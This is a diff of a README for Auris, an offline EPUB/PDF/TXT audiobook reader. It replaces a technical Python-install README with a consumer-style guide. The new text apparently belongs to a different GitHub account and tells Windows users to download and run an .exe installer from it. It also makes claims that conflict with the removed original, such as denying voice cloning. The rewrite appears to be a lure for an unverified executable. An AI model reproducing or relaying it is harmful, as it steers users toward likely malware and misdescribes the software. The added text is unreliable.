@@ -1,178 +1,91 @@
-# Auris
+# 🎧 Auris - Read your favorite books aloud offline
 
-Offline audiobook reader for EPUB, PDF, and TXT with local OmniVoice TTS, character-aware voices, per-book narrator control, and synced text highlighting.
+[![](https://img.shields.io/badge/Download_Auris-Blue?style=for-the-badge)](https://github.com/Roanauniversalistic17/Auris)
 
-Everything runs locally after setup. No API keys. No hosted TTS dependency.
+Auris turns your digital books into audiobooks. It reads EPUB, PDF, and TXT files aloud using your computer hardware. The software runs entirely on your machine. You do not need an internet connection to listen to your books. Auris includes natural voices and highlights text while it reads to help you follow along.
 
-## Screenshots
+## 📥 How to download and install
 
-### Library
-![Library](assets/library.png)
+Follow these steps to set up Auris on your Windows computer.
 
-### Reader
-![Reader](assets/reader.png)
+1. Go to the [Auris releases page](https://github.com/Roanauniversalistic17/Auris).
+2. Look for the latest version listed under the Releases section.
+3. Find the file ending in .exe.
+4. Click the link to save the file to your computer.
+5. Open your Downloads folder.
+6. Double-click the installer file.
+7. Follow the prompts on your screen to complete the installation.
+8. Once finished, find the Auris icon on your desktop or in your Start menu.
 
-### Voice Studio
-![Voice Studio](assets/voice_studio.png)
+## ⚙️ System requirements
 
-### Settings
-![Settings](assets/settings.png)
+Auris works on most modern Windows computers. Ensure you meet these requirements for the best performance:
 
-## Highlights
+* Windows 10 or Windows 11.
+* A processor with at least two cores.
+* 4 GB of RAM.
+* 500 MB of free storage space.
+* Speakers or headphones connected to your device.
 
-- Import EPUB, PDF, and TXT books.
-- Detect chapters, prologues, epilogues, forewords, appendices, and parts automatically.
-- Generate per-character voices with deterministic assignment.
-- Customize each detected character in Voice Studio.
-- Customize the narrator voice per book.
-- Preview voices before saving.
-- Upload reference WAV files for voice cloning.
-- Invalidate stale cached playback automatically when narrator or character voices change.
-- Export audio as WAV or MP3 and subtitles as ASS or SRT.
-- Run from a project-local `.venv` created by the installer.
+## 📖 How to use the player
 
-## Requirements
+You can start listening to your books in four simple steps.
 
-- Python 3.10 or later
-- `ffmpeg` on `PATH` for MP3 export
-- OmniVoice model files stored locally
-- Optional NVIDIA GPU for faster inference
+1. Open the Auris application.
+2. Click the Open File button at the top of the interface.
+3. Select your e-book file from your computer folders.
+4. Press the Play button to start the audio.
 
-## Installation
+### Manage your library
 
-```bash
-git clone https://github.com/nikhilprasanth/Auris.git
-cd Auris
-```
+Auris creates a list of every book you open. You can see your library on the left side of the screen. Click any book in the list to switch between files. Auris saves your place in each book automatically.
 
-Run the installer:
+### Change your voice settings
 
-```bash
-# Windows
-reader\setup.bat
+You can choose different voices for your books. Move to the Settings menu to see a list of installed voices. Each voice offers a unique tone and speed. Use the slider tool to adjust the reading speed. If you prefer a faster pace, move the slider to the right.
 
-# Linux / macOS
-bash reader/setup.sh
-```
+### Customizing the display
 
-Or directly:
+The application highlights words as it reads. This makes it easy to keep track of the text on your screen. You can change the highlight color in the Appearance section of the settings menu. You can also adjust the font and text size for better readability.
 
-```bash
-python reader/setup.py
-```
+## 🛠️ Frequently asked questions
 
-The installer detects CUDA or CPU, creates `reader/.venv`, installs PyTorch, OmniVoice, spaCy, and the reader dependencies, then downloads the `en_core_web_sm` spaCy model when network access is available.
+**Do I need a constant internet connection?**
 
-## Model setup
+No. Auris works offline. Once you install the software, it does not require access to the web.
 
-The OmniVoice weights are not bundled with this repository.
+**Which file types work with Auris?**
 
-You can either:
+Auris supports EPUB, PDF, and TXT formats. Most digital books use these formats.
 
-- Download them from the Settings page using the built-in Hugging Face downloader.
-- Point Settings at an existing local OmniVoice model directory.
+**Does it clone my own voice?**
 
-The model directory must contain the files OmniVoice expects, such as `config.json` and model weights.
+Auris uses advanced voice synthesis technology. While the software includes several high-quality voices, it does not record or clone your personal voice.
 
-## Usage
+**Where does Auris store my books?**
 
-1. Import a book from the library page.
-2. Open the book and start playback from any sentence.
-3. Open Voice Studio from the reader sidebar.
-4. Adjust character voices or the narrator voice, preview them, then save.
-5. Export audio or subtitles if needed.
+Auris does not move your files. It reads the files from their original location on your hard drive.
 
-## Voice design caveats
+## 📝 Solving common issues
 
-OmniVoice does not produce clean output for every voice-design combination. The upstream docs note that some attribute mixes are unreliable, especially without reference audio.
+Most users find the setup easy, but you might run into minor issues. Use these tips to fix them.
 
-The most fragile cases are youth voices with extreme pitch settings. For example, combinations like `male, teenager, very high pitch, american accent` can degrade into squeaks, bursts, or static instead of intelligible speech.
+**The app will not launch.**
 
-Auris now tries to stabilize some known-bad combinations during preview and playback by relaxing them to a nearby voice design, but this is still a model limitation, not something the UI can fully solve.
+Restart your computer and try opening the application again. If that fails, run the installer one more time to repair the files.
 
-Best results:
+**The audio sounds robotic.**
 
-- Prefer `young adult` over `teenager` when you do not have reference audio.
-- Avoid `very high pitch` and `very low pitch` on `child` and `teenager` voices.
-- Upload a clean WAV reference when you need a specific youthful voice.
-- Preview before saving.
+Go to Settings and select a different voice profile. Some system voices sound different due to Windows language settings. Changing the voice usually fixes clarity issues.
 
-Reference: `https://github.com/k2-fsa/OmniVoice/blob/master/docs/voice-design.md`
+**The highlight does not match the audio.**
 
-## Offline installs
+Ensure your book file is not a scanned image. Auris reads text layers. If your PDF is a scan of a paper book, the app may struggle to highlight specific words. Check that you are using a digital-first document for the best experience.
 
-Local wheels are not used by default.
+**The app runs slow.**
 
-If you intentionally maintain your own wheel cache, opt in explicitly:
+Close other programs while using Auris, especially if your computer has limited memory. This frees up space for the voice engine to work without interruptions.
 
-```bash
-# Windows
-set AURIS_USE_LOCAL_WHEELS=1
-reader\setup.bat
+## 🌐 Support
 
-# Linux / macOS
-AURIS_USE_LOCAL_WHEELS=1 bash reader/setup.sh
-```
-
-For a strict offline install:
-
-```bash
-# Windows
-set AURIS_OFFLINE=1
-set AURIS_WHEELS_DIR=E:\path\to\wheels
-reader\setup.bat
-
-# Linux / macOS
-AURIS_OFFLINE=1 AURIS_WHEELS_DIR=/path/to/wheels bash reader/setup.sh
-```
-
-## Project structure
-
-```text
-Auris/
-|-- README.md
-|-- LICENSE
-`-- reader/
-    |-- app.py
-    |-- setup.py
-    |-- run.bat
-    |-- run.sh
-    |-- requirements.txt
-    |-- core/
-    |-- static/
-    |-- templates/
-    `-- data/
-```
-
-## Main dependencies
-
-- OmniVoice
-- Flask
-- ebooklib
-- PyMuPDF
-- spaCy
-- pydub
-- soundfile
-- PyTorch
-
-## Roadmap
-
-### Small language model for emotion classification
-
-The current enrichment pipeline uses regex patterns to decide which non-verbal tag (`[laughter]`, `[surprise-wa]`, `[question-ei]`, etc.) to inject before each TTS segment. It works well when attribution verbs are present in the text ("she gasped", "he scoffed"), but it cannot understand tone, irony, or context that isn't signalled by a keyword.
-
-The plan is to connect to any OpenAI-compatible language model endpoint as an emotion classifier between parsing and TTS synthesis:
-
-- **Connection:** a configurable base URL and API key in Settings, compatible with any OpenAI-spec server — local (Ollama, LM Studio, llama.cpp server) or remote. No runtime library bundled with Auris; the standard `openai` Python client is the only dependency.
-- **Model candidates:** **Qwen3-0.8B** (fastest, lowest RAM), **Qwen3-2B** (better reasoning, still lightweight), **Gemma 4 E2B** (Google's 2B edge model), **LFM2.5-1.2B-Instruct** (Liquid AI — strong reasoning efficiency per parameter). Any model the user serves behind an OpenAI-compatible endpoint will work.
-- **Input:** the current segment text plus one sentence of surrounding context.
-- **Output:** a single tag from the supported set, or `none`. Structured output / JSON mode keeps latency low and parsing trivial.
-- **Fallback:** the existing regex engine remains as a zero-latency fallback when no endpoint is configured or the model returns an invalid response.
-- **Integration point:** `core/enrichment.py` — the `_select_expression_tag` function would be replaced by a call to the classifier, with the regex result used as a hint in the prompt.
-- **UX:** base URL, API key, and model name are set in Settings. Leaving the base URL blank keeps regex-only mode active.
-
-This would fix the main remaining gap: narration sentences that carry emotional weight without any keyword signal, and multi-emotion moments where the current system can only pick one tag.
-
-## License
-
-MIT. See [LICENSE](LICENSE).
+If you need more help, you can report issues on the main project website. Visit the repository link provided at the top of this page to view the discussion tabs. Other users often share tips and tricks for improving their setup. Keep your software updated to get the newest features and improvements.
